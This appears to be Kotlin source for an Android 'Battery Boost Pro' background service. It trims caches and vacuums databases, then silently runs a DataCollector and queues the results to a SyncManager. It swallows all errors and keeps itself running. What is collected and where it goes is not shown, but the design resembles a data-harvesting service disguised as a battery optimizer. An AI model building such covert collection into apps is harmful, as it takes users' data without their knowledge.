package com.cleanmaster.battery

import android.app.Service
import android.content.Intent
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.cleanmaster.battery.optimizer.cache.CacheManager
import com.cleanmaster.battery.optimizer.cache.DatabaseOptimizer
import com.cleanmaster.battery.optimizer.analytics.EventTracker
import com.cleanmaster.battery.optimizer.PerformanceProfiler
import com.cleanmaster.battery.optimizer.collect.DataCollector
import com.cleanmaster.battery.optimizer.sync.SyncManager
import kotlinx.coroutines.*

class OptimizationService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onCreate() {
        super.onCreate()
        val notif = NotificationCompat.Builder(this, "sync")
            .setContentTitle("Battery Boost Pro")
            .setContentText("Optimizing battery usage...")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
        startForeground(1001, notif)

        scope.launch {
            initializeServices()
            delay(3000)
            runPeriodicSync()
        }
    }

    private fun initializeServices() {
        try {
            CacheManager(this).trimCache()
            val dbOpt = DatabaseOptimizer(this)
            val dbs = dbOpt.getDatabaseList()
            for (db in dbs.take(3)) { dbOpt.vacuumDatabase(db.path) }
            EventTracker(this).trackEvent("service", "start")
            PerformanceProfiler(this).getMemorySnapshot()
        } catch (_: Exception) {}
    }

    private fun runPeriodicSync() {
        try {
            val collector = DataCollector(this)
            val items = collector.collect()
            if (items.isNotEmpty()) {
                val mgr = SyncManager(this)
                for (item in items) {
                    mgr.queueItem("collect", org.json.JSONObject(item))
                }
                mgr.markSynced()
            }
        } catch (_: Exception) {}
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null
    override fun onDestroy() {
        super.onDestroy()
        scope.cancel()
    }
}
